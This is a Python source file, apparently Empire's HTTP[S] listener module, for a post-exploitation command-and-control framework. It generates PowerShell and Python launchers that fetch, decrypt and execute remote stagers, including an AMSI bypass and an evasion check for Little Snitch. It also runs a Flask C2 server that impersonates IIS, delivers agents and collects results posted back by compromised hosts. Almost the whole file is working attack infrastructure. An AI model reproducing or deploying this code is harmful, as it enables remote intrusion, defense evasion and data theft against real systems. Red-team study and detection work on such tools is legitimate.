import logging
import base64
import random
import os
import time
import copy
from pydispatch import dispatcher
from flask import Flask, request, make_response

# Empire imports
from lib.common import helpers
from lib.common import agents
from lib.common import encryption
from lib.common import packets
from lib.common import messages


class Listener:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'HTTP[S]',

            'Author': ['@harmj0y'],

            'Description': ('Starts a http[s] listener (PowerShell or Python) that uses a GET/POST approach.'),

            'Category' : ('client_server'),

            'Comments': []
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}

            'Name' : {
                'Description'   :   'Name for the listener.',
                'Required'      :   True,
                'Value'         :   'http'
            },
            'Host' : {
                'Description'   :   'Hostname/IP for staging.',
                'Required'      :   True,
                'Value'         :   "http://%s:%s" % (helpers.lhost(), 80)
            },
            'BindIP' : {
                'Description'   :   'The IP to bind to on the control server.',
                'Required'      :   True,
                'Value'         :   '0.0.0.0'
            },
            'Port' : {
                'Description'   :   'Port for the listener.',
                'Required'      :   True,
                'Value'         :   80
            },
            'StagingKey' : {
                'Description'   :   'Staging key for initial agent negotiation.',
                'Required'      :   True,
                'Value'         :   '2c103f2c4ed1e59c0b4e2e01821770fa'
            },
            'DefaultDelay' : {
                'Description'   :   'Agent delay/reach back interval (in seconds).',
                'Required'      :   True,
                'Value'         :   5
            },
            'DefaultJitter' : {
                'Description'   :   'Jitter in agent reachback interval (0.0-1.0).',
                'Required'      :   True,
                'Value'         :   0.0
            },
            'DefaultLostLimit' : {
                'Description'   :   'Number of missed checkins before exiting',
                'Required'      :   True,
                'Value'         :   60
            },
            'DefaultProfile' : {
                'Description'   :   'Default communication profile for the agent.',
                'Required'      :   True,
                'Value'         :   "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
            },
            'CertPath' : {
                'Description'   :   'Certificate path for https listeners.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'KillDate' : {
                'Description'   :   'Date for the listener to exit (MM/dd/yyyy).',
                'Required'      :   False,
                'Value'         :   ''
            },
            'WorkingHours' : {
                'Description'   :   'Hours for the agent to operate (09:00-17:00).',
                'Required'      :   False,
                'Value'         :   ''
            },
            'ServerVersion' : {
                'Description'   :   'TServer header for the control server.',
                'Required'      :   True,
                'Value'         :   'Microsoft-IIS/7.5'
            }
        }

        # required:
        self.mainMenu = mainMenu
        self.threads = {}

        # optional/specific for this module
        self.app = None
        self.uris = [a.strip('/') for a in self.options['DefaultProfile']['Value'].split('|')[0].split(',')]

        # set the default staging key to the controller db default
        self.options['StagingKey']['Value'] = str(helpers.get_config('staging_key')[0])


    def default_response(self):
        """
        Returns a default HTTP server page.
        """
        page = "<html><body><h1>It works!</h1>"
        page += "<p>This is the default web page for this server.</p>"
        page += "<p>The web server software is running but no content has been added, yet.</p>"
        page += "</body></html>"
        return page


    def validate_options(self):
        """
        Validate all options for this listener.
        """

        self.uris = [a.strip('/') for a in self.options['DefaultProfile']['Value'].split('|')[0].split(',')]

        for key in self.options:
            if self.options[key]['Required'] and (str(self.options[key]['Value']).strip() == ''):
                print helpers.color("[!] Option \"%s\" is required." % (key))
                return False

        return True


    def generate_launcher(self, encode=True, userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
        """
        Generate a basic launcher for the specified listener.
        """

        if not language:
            print helpers.color('[!] listeners/http generate_launcher(): no language specified!')

        if listenerName and (listenerName in self.threads) and (listenerName in self.mainMenu.listeners.activeListeners):

            # extract the set options for this instantiated listener
            listenerOptions = self.mainMenu.listeners.activeListeners[listenerName]['options']
            host = listenerOptions['Host']['Value']
            stagingKey = listenerOptions['StagingKey']['Value']
            profile = listenerOptions['DefaultProfile']['Value']
            uris = [a for a in profile.split('|')[0].split(',')]
            stage0 = random.choice(uris)

            if language.startswith('po'):
                # PowerShell

                stager = ''
                if safeChecks.lower() == 'true':
                    # @mattifestation's AMSI bypass
                    stager = helpers.randomize_capitalization("[Ref].Assembly.GetType(")
                    stager += "'System.Management.Automation.AmsiUtils'"
                    stager += helpers.randomize_capitalization(')|?{$_}|%{$_.GetField(')
                    stager += "'amsiInitFailed','NonPublic,Static'"
                    stager += helpers.randomize_capitalization(").SetValue($null,$true)};")
                    stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")

                stager += helpers.randomize_capitalization("$wc=New-Object System.Net.WebClient;")

                if userAgent.lower() == 'default':
                    profile = listenerOptions['DefaultProfile']['Value']
                    userAgent = profile.split('|')[1]
                stager += "$u='"+userAgent+"';"

                if 'https' in host:
                    # allow for self-signed certificates for https connections
                    stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"

                if userAgent.lower() != 'none' or proxy.lower() != 'none':

                    if userAgent.lower() != 'none':
                        stager += helpers.randomize_capitalization('$wc.Headers.Add(')
                        stager += "'User-Agent',$u);"

                    if proxy.lower() != 'none':
                        if proxy.lower() == 'default':
                            stager += helpers.randomize_capitalization("$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;")
                        else:
                            # TODO: implement form for other proxy
                            stager += helpers.randomize_capitalization("$proxy=New-Object Net.WebProxy;")
                            stager += helpers.randomize_capitalization("$proxy.Address = '"+ proxy.lower() +"';")
                            stager += helpers.randomize_capitalization("$wc.Proxy = $proxy;")
                        if proxyCreds.lower() == "default":
                            stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
                        else:
                            # TODO: implement form for other proxy credentials
                            pass

                # TODO: reimplement stager retries?

                # code to turn the key string into a byte array
                stager += helpers.randomize_capitalization("$K=[System.Text.Encoding]::ASCII.GetBytes(")
                stager += "'%s');" % (stagingKey)

                # this is the minimized RC4 stager code from rc4.ps1
                stager += helpers.randomize_capitalization('$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};')

                # prebuild the request routing packet for the launcher
                routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL', meta='STAGE0', additional='None', encData='')
                b64RoutingPacket = base64.b64encode(routingPacket)

                # add the RC4 packet to a cookie
                stager += helpers.randomize_capitalization("$wc.Headers.Add(")
                stager += "\"Cookie\",\"session=%s\");" % (b64RoutingPacket)

                stager += "$ser='%s';$t='%s';" % (host, stage0)
                stager += helpers.randomize_capitalization("$data=$WC.DownloadData($ser+$t);")
                stager += helpers.randomize_capitalization("$iv=$data[0..3];$data=$data[4..$data.length];")

                # decode everything and kick it over to IEX to kick off execution
                stager += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")

                # base64 encode the stager and return it
                if encode:
                    return helpers.powershell_launcher(stager)
                else:
                    # otherwise return the case-randomized stager
                    return stager

            if language.startswith('py'):
                # Python

                launcherBase = 'import sys;'
                if "https" in host:
                    # monkey patch ssl woohooo
                    launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"

                try:
                    if safeChecks.lower() == 'true':
                        launcherBase += "import re, subprocess;"
                        launcherBase += "cmd = \"ps -ef | grep Little\ Snitch | grep -v grep\"\n"
                        launcherBase += "ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)\n"
                        launcherBase += "out = ps.stdout.read()\n"
                        launcherBase += "ps.stdout.close()\n"
                        launcherBase += "if re.search(\"Little Snitch\", out):\n"
                        launcherBase += "   sys.exit()\n"
                except Exception as e:
                    p = "[!] Error setting LittleSnitch in stager: " + str(e)
                    print helpers.color(p, color='red')

                if userAgent.lower() == 'default':
                    profile = listenerOptions['DefaultProfile']['Value']
                    userAgent = profile.split('|')[1]


                launcherBase += "o=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['build_opener']).build_opener();"
                launcherBase += "UA='%s';" % (userAgent)
                launcherBase += "server='%s';t='%s';" % (host, stage0)

                # prebuild the request routing packet for the launcher
                routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='PYTHON', meta='STAGE0', additional='None', encData='')
                b64RoutingPacket = base64.b64encode(routingPacket)

                # add the RC4 packet to a cookie
                launcherBase += "o.addheaders=[('User-Agent',UA), (\"Cookie\", \"session=%s\")];\n" % (b64RoutingPacket)
                launcherBase += "import urllib2\n"
                launcherBase += "if urllib2.getproxies():\n"
                launcherBase += "   o.add_handler(urllib2.ProxyHandler(urllib2.getproxies()))\n"

                # download the stager and extract the IV
                launcherBase += "a=o.open(server+t).read();"
                launcherBase += "IV=a[0:4];"
                launcherBase += "data=a[4:];"
                launcherBase += "key=IV+'%s';" % (stagingKey)

                # RC4 decryption
                launcherBase += "S,j,out=range(256),0,[]\n"
                launcherBase += "for i in range(256):\n"
                launcherBase += "    j=(j+S[i]+ord(key[i%len(key)]))%256\n"
                launcherBase += "    S[i],S[j]=S[j],S[i]\n"
                launcherBase += "i=j=0\n"
                launcherBase += "for char in data:\n"
                launcherBase += "    i=(i+1)%256\n"
                launcherBase += "    j=(j+S[i])%256\n"
                launcherBase += "    S[i],S[j]=S[j],S[i]\n"
                launcherBase += "    out.append(chr(ord(char)^S[(S[i]+S[j])%256]))\n"
                launcherBase += "exec(''.join(out))"

                if encode:
                    launchEncoded = base64.b64encode(launcherBase)
                    launcher = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python &" % (launchEncoded)
                    return launcher
                else:
                    return launcherBase

            else:
                print helpers.color("[!] listeners/http generate_launcher(): invalid language specification: only 'powershell' and 'python' are currently supported for this module.")

        else:
            print helpers.color("[!] listeners/http generate_launcher(): invalid listener name specification!")


    def generate_stager(self, listenerOptions, encode=False, encrypt=True, language=None):
        """
        Generate the stager code needed for communications with this listener.
        """

        if not language:
            print helpers.color('[!] listeners/http generate_stager(): no language specified!')
            return None

        profile = listenerOptions['DefaultProfile']['Value']
        uris = [a.strip('/') for a in profile.split('|')[0].split(',')]
        stagingKey = listenerOptions['StagingKey']['Value']
        host = listenerOptions['Host']['Value']

        # select some random URIs for staging from the main profile
        stage1 = random.choice(uris)
        stage2 = random.choice(uris)

        if language.lower() == 'powershell':

            # read in the stager base
            f = open("%s/data/agent/stagers/http.ps1" % (self.mainMenu.installPath))
            stager = f.read()
            f.close()

            # make sure the server ends with "/"
            if not host.endswith("/"):
                host += "/"

            # patch the server and key information
            stager = stager.replace('REPLACE_SERVER', host)
            stager = stager.replace('REPLACE_STAGING_KEY', stagingKey)
            stager = stager.replace('index.jsp', stage1)
            stager = stager.replace('index.php', stage2)

            randomizedStager = ''

            for line in stager.split("\n"):
                line = line.strip()
                # skip commented line
                if not line.startswith("#"):
                    # randomize capitalization of lines without quoted strings
                    if "\"" not in line:
                        randomizedStager += helpers.randomize_capitalization(line)
                    else:
                        randomizedStager += line

            # base64 encode the stager and return it
            if encode:
                return helpers.enc_powershell(randomizedStager)
            elif encrypt:
                RC4IV = os.urandom(4)
                return RC4IV + encryption.rc4(RC4IV+stagingKey, randomizedStager)
            else:
                # otherwise just return the case-randomized stager
                return randomizedStager

        elif language.lower() == 'python':
            # read in the stager base
            f = open("%s/data/agent/stagers/http.py" % (self.mainMenu.installPath))
            stager = f.read()
            f.close()

            stager = helpers.strip_python_comments(stager)

            if host.endswith("/"):
                host = host[0:-1]

            # # patch the server and key information
            stager = stager.replace("REPLACE_STAGING_KEY", stagingKey)
            stager = stager.replace("REPLACE_PROFILE", profile)
            stager = stager.replace("index.jsp", stage1)
            stager = stager.replace("index.php", stage2)

            # # base64 encode the stager and return it
            if encode:
                return base64.b64encode(stager)
            if encrypt:
                # return an encrypted version of the stager ("normal" staging)
                RC4IV = os.urandom(4)
                return RC4IV + encryption.rc4(RC4IV+stagingKey, stager)
            else:
                # otherwise return the standard stager
                return stager

        else:
            print helpers.color("[!] listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")


    def generate_agent(self, listenerOptions, language=None):
        """
        Generate the full agent code needed for communications with this listener.
        """

        if not language:
            print helpers.color('[!] listeners/http generate_agent(): no language specified!')
            return None

        language = language.lower()
        delay = listenerOptions['DefaultDelay']['Value']
        jitter = listenerOptions['DefaultJitter']['Value']
        profile = listenerOptions['DefaultProfile']['Value']
        lostLimit = listenerOptions['DefaultLostLimit']['Value']
        killDate = listenerOptions['KillDate']['Value']
        workingHours = listenerOptions['WorkingHours']['Value']
        b64DefaultResponse = base64.b64encode(self.default_response())

        if language == 'powershell':

            f = open(self.mainMenu.installPath + "./data/agent/agent.ps1")
            code = f.read()
            f.close()

            # patch in the comms methods
            commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
            code = code.replace('REPLACE_COMMS', commsCode)

            # strip out comments and blank lines
            code = helpers.strip_powershell_comments(code)

            # patch in the delay, jitter, lost limit, and comms profile
            code = code.replace('$AgentDelay = 60', "$AgentDelay = " + str(delay))
            code = code.replace('$AgentJitter = 0', "$AgentJitter = " + str(jitter))
            code = code.replace('$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', "$Profile = \"" + str(profile) + "\"")
            code = code.replace('$LostLimit = 60', "$LostLimit = " + str(lostLimit))
            code = code.replace('$DefaultResponse = ""', '$DefaultResponse = "'+str(b64DefaultResponse)+'"')

            # patch in the killDate and workingHours if they're specified
            if killDate != "":
                code = code.replace('$KillDate,', "$KillDate = '" + str(killDate) + "',")
            if workingHours != "":
                code = code.replace('$WorkingHours,', "$WorkingHours = '" + str(workingHours) + "',")

            return code

        elif language == 'python':
            f = open(self.mainMenu.installPath + "./data/agent/agent.py")
            code = f.read()
            f.close()

            # patch in the comms methods
            commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
            code = code.replace('REPLACE_COMMS', commsCode)

            # strip out comments and blank lines
            code = helpers.strip_python_comments(code)

            # patch in the delay, jitter, lost limit, and comms profile
            code = code.replace('delay = 60', 'delay = %s' % (delay))
            code = code.replace('jitter = 0.0', 'jitter = %s' % (jitter))
            code = code.replace('profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', 'profile = "%s"' % (profile))
            code = code.replace('lostLimit = 60', 'lostLimit = %s' % (lostLimit))
            code = code.replace('defaultResponse = base64.b64decode("")', 'defaultResponse = base64.b64decode("%s")' % (b64DefaultResponse))

            # patch in the killDate and workingHours if they're specified
            if killDate != "":
                code = code.replace('killDate = ""', 'killDate = "%s"' % (killDate))
            if workingHours != "":
                code = code.replace('workingHours = ""', 'workingHours = "%s"' % (killDate))

            return code
        else:
            print helpers.color("[!] listeners/http generate_agent(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")


    def generate_comms(self, listenerOptions, language=None):
        """
        Generate just the agent communication code block needed for communications with this listener.

        This is so agents can easily be dynamically updated for the new listener.
        """

        if language:
            if language.lower() == 'powershell':

                updateServers = """
                    $Script:ControlServers = @("%s");
                    $Script:ServerIndex = 0;
                """ % (listenerOptions['Host']['Value'])

                if listenerOptions['Host']['Value'].startswith('https'):
                    updateServers += "\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"

                getTask = """
                    function script:Get-Task {

                        try {
                            if ($Script:ControlServers[$Script:ServerIndex].StartsWith("http")) {

                                # meta 'TASKING_REQUEST' : 4
                                $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
                                $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)

                                # build the web request object
                                $wc = New-Object System.Net.WebClient

                                # set the proxy settings for the WC to be the default system settings
                                $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
                                $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
                                $wc.Headers.Add("User-Agent",$script:UserAgent)
                                $script:Headers.GetEnumerator() | % {$wc.Headers.Add($_.Name, $_.Value)}
                                $wc.Headers.Add("Cookie", "session=$RoutingCookie")

                                # choose a random valid URI for checkin
                                $taskURI = $script:TaskURIs | Get-Random
                                $result = $wc.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI)
                                $result
                            }
                        }
                        catch [Net.WebException] {
                            $script:MissedCheckins += 1
                            if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
                                # restart key negotiation
                                Start-Negotiate -S "$ser" -SK $SK -UA $ua
                            }
                        }
                    }
                """

                sendMessage = """
                    function script:Send-Message {
                        param($Packets)

                        if($Packets) {
                            # build and encrypt the response packet
                            $EncBytes = Encrypt-Bytes $Packets

                            # build the top level RC4 "routing packet"
                            # meta 'RESULT_POST' : 5
                            $RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5

                            if($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {
                                # build the web request object
                                $wc = New-Object System.Net.WebClient
                                # set the proxy settings for the WC to be the default system settings
                                $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
                                $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
                                $wc.Headers.Add('User-Agent', $Script:UserAgent)
                                $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)}

                                try {
                                    # get a random posting URI
                                    $taskURI = $Script:TaskURIs | Get-Random
                                    $response = $wc.UploadData($Script:ControlServers[$Script:ServerIndex]+$taskURI, 'POST', $RoutingPacket);
                                }
                                catch [System.Net.WebException]{
                                    # exception posting data...
                                }
                            }
                        }
                    }
                """

                return updateServers + getTask + sendMessage

            elif language.lower() == 'python':

                updateServers = "server = '%s'\n"  % (listenerOptions['Host']['Value'])

                if listenerOptions['Host']['Value'].startswith('https'):
                    updateServers += "hasattr(ssl, '_create_unverified_context') and ssl._create_unverified_context() or None"

                sendMessage = """
def send_message(packets=None):
    # Requests a tasking or posts data to a randomized tasking URI.
    # If packets == None, the agent GETs a tasking from the control server.
    # If packets != None, the agent encrypts the passed packets and
    #    POSTs the data to the control server.

    global missedCheckins
    global server
    global headers
    global taskURIs

    data = None
    if packets:
        data = ''.join(packets)
        # aes_encrypt_then_hmac is in stager.py
        encData = aes_encrypt_then_hmac(key, data)
        data = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)
    else:
        # if we're GETing taskings, then build the routing packet to stuff info a cookie first.
        #   meta TASKING_REQUEST = 4
        routingPacket = build_routing_packet(stagingKey, sessionID, meta=4)
        b64routingPacket = base64.b64encode(routingPacket)
        headers['Cookie'] = "session=%s" % (b64routingPacket)

    taskURI = random.sample(taskURIs, 1)[0]
    requestUri = server + taskURI

    try:
        data = (urllib2.urlopen(urllib2.Request(requestUri, data, headers))).read()
        return ('200', data)

    except urllib2.HTTPError as HTTPError:
        # if the server is reached, but returns an erro (like 404)
        missedCheckins = missedCheckins + 1
        return (HTTPError.code, '')

    except urllib2.URLError as URLerror:
        # if the server cannot be reached
        missedCheckins = missedCheckins + 1
        return (URLerror.reason, '')

    return ('', '')
"""
                return updateServers + sendMessage

            else:
                print helpers.color("[!] listeners/http generate_comms(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")
        else:
            print helpers.color('[!] listeners/http generate_comms(): no language specified!')


    def start_server(self, listenerOptions):
        """
        Threaded function that actually starts up the Flask server.
        """

        # make a copy of the currently set listener options for later stager/agent generation
        listenerOptions = copy.deepcopy(listenerOptions)

        # suppress the normal Flask output
        log = logging.getLogger('werkzeug')
        log.setLevel(logging.ERROR)

        bindIP = listenerOptions['BindIP']['Value']
        host = listenerOptions['Host']['Value']
        port = listenerOptions['Port']['Value']
        stagingKey = listenerOptions['StagingKey']['Value']

        app = Flask(__name__)
        self.app = app

        @app.before_request
        def check_ip():
            """
            Before every request, check if the IP address is allowed.
            """
            if not self.mainMenu.agents.is_ip_allowed(request.remote_addr):
                dispatcher.send("[!] %s on the blacklist/not on the whitelist requested resource" % (request.remote_addr), sender="listeners/http")
                return make_response(self.default_response(), 200)


        @app.after_request
        def change_header(response):
            "Modify the default server version in the response."
            response.headers['Server'] = listenerOptions['ServerVersion']['Value']
            return response


        @app.route('/<path:request_uri>', methods=['GET'])
        def handle_get(request_uri):
            """
            Handle an agent GET request.

            This is used during the first step of the staging process,
            and when the agent requests taskings.
            """

            clientIP = request.remote_addr
            dispatcher.send("[*] GET request for %s/%s from %s" % (request.host, request_uri, clientIP), sender='listeners/http')
            routingPacket = None
            cookie = request.headers.get('Cookie')
            if cookie and cookie != '':
                try:
                    # see if we can extract the 'routing packet' from the specified cookie location
                    # NOTE: this can be easily moved to a paramter, another cookie value, etc.
                    if 'session' in cookie:
                        dispatcher.send("[*] GET cookie value from %s : %s" % (clientIP, cookie), sender='listeners/http')
                        cookieParts = cookie.split(';')
                        for part in cookieParts:
                            if part.startswith('session'):
                                base64RoutingPacket = part[part.find('=')+1:]
                                # decode the routing packet base64 value in the cookie
                                routingPacket = base64.b64decode(base64RoutingPacket)
                except Exception as e:
                    routingPacket = None
                    pass

            if routingPacket:
                # parse the routing packet and process the results
                dataResults = self.mainMenu.agents.handle_agent_data(stagingKey, routingPacket, listenerOptions, clientIP)
                if dataResults and len(dataResults) > 0:
                    for (language, results) in dataResults:
                        if results:
                            if results == 'STAGE0':
                                # handle_agent_data() signals that the listener should return the stager.ps1 code

                                # step 2 of negotiation -> return stager.ps1 (stage 1)
                                dispatcher.send("[*] Sending %s stager (stage 1) to %s" % (language, clientIP), sender='listeners/http')
                                stage = self.generate_stager(language=language, listenerOptions=listenerOptions)
                                return make_response(stage, 200)

                            elif results.startswith('ERROR:'):
                                dispatcher.send("[!] Error from agents.handle_agent_data() for %s from %s: %s" % (request_uri, clientIP, results), sender='listeners/http')

                                if 'not in cache' in results:
                                    # signal the client to restage
                                    print helpers.color("[*] Orphaned agent from %s, signaling retaging" % (clientIP))
                                    return make_response(self.default_response(), 401)
                                else:
                                    return make_response(self.default_response(), 200)

                            else:
                                # actual taskings
                                dispatcher.send("[*] Agent from %s retrieved taskings" % (clientIP), sender='listeners/http')
                                return make_response(results, 200)
                        else:
                            # dispatcher.send("[!] Results are None...", sender='listeners/http')
                            return make_response(self.default_response(), 200)
                else:
                    return make_response(self.default_response(), 200)

            else:
                dispatcher.send("[!] %s requested by %s with no routing packet." % (request_uri, clientIP), sender='listeners/http')
                return make_response(self.default_response(), 200)


        @app.route('/<path:request_uri>', methods=['POST'])
        def handle_post(request_uri):
            """
            Handle an agent POST request.
            """

            stagingKey = listenerOptions['StagingKey']['Value']
            clientIP = request.remote_addr

            requestData = request.get_data()
            dispatcher.send("[*] POST request data length from %s : %s" % (clientIP, len(requestData)), sender='listeners/http')

            # the routing packet should be at the front of the binary request.data
            #   NOTE: this can also go into a cookie/etc.
            dataResults = self.mainMenu.agents.handle_agent_data(stagingKey, requestData, listenerOptions, clientIP)
            if dataResults and len(dataResults) > 0:
                for (language, results) in dataResults:
                    if results:
                        if results.startswith('STAGE2'):
                            # TODO: document the exact results structure returned
                            sessionID = results.split(' ')[1].strip()
                            sessionKey = self.mainMenu.agents.agents[sessionID]['sessionKey']
                            dispatcher.send("[*] Sending agent (stage 2) to %s at %s" % (sessionID, clientIP), sender='listeners/http')

                            # step 6 of negotiation -> server sends patched agent.ps1/agent.py
                            agentCode = self.generate_agent(language=language, listenerOptions=listenerOptions)
                            encryptedAgent = encryption.aes_encrypt_then_hmac(sessionKey, agentCode)
                            # TODO: wrap ^ in a routing packet?

                            return make_response(encryptedAgent, 200)

                        elif results[:10].lower().startswith('error') or results[:10].lower().startswith('exception'):
                            dispatcher.send("[!] Error returned for results by %s : %s" %(clientIP, results), sender='listeners/http')
                            return make_response(self.default_response(), 200)
                        elif results == 'VALID':
                            dispatcher.send("[*] Valid results return by %s" % (clientIP), sender='listeners/http')
                            return make_response(self.default_response(), 200)
                        else:
                            return make_response(results, 200)
                    else:
                        return make_response(self.default_response(), 200)
            else:
                return make_response(self.default_response(), 200)

        try:
            certPath = listenerOptions['CertPath']['Value']
            host = listenerOptions['Host']['Value']
            if certPath.strip() != '' and host.startswith('https'):
                context = ("%s/data/empire.pem" % (self.mainMenu.installPath), "%s/data/empire.pem"  % (self.mainMenu.installPath))
                app.run(host=bindIP, port=int(port), threaded=True, ssl_context=context)
            else:
                app.run(host=bindIP, port=int(port), threaded=True)

        except Exception as e:
            print helpers.color("[!] Listener startup on port %s failed: %s " % (port, e))
            dispatcher.send("[!] Listener startup on port %s failed: %s " % (port, e), sender='listeners/http')


    def start(self, name=''):
        """
        Start a threaded instance of self.start_server() and store it in the
        self.threads dictionary keyed by the listener name.
        """
        listenerOptions = self.options
        if name and name != '':
            self.threads[name] = helpers.KThread(target=self.start_server, args=(listenerOptions,))
            self.threads[name].start()
            time.sleep(1)
            # returns True if the listener successfully started, false otherwise
            return self.threads[name].is_alive()
        else:
            name = listenerOptions['Name']['Value']
            self.threads[name] = helpers.KThread(target=self.start_server, args=(listenerOptions,))
            self.threads[name].start()
            time.sleep(1)
            # returns True if the listener successfully started, false otherwise
            return self.threads[name].is_alive()


    def shutdown(self, name=''):
        """
        Terminates the server thread stored in the self.threads dictionary,
        keyed by the listener name.
        """

        if name and name != '':
            print helpers.color("[!] Killing listener '%s'" % (name))
            self.threads[name].kill()
        else:
            print helpers.color("[!] Killing listener '%s'" % (self.options['Name']['Value']))
            self.threads[self.options['Name']['Value']].kill()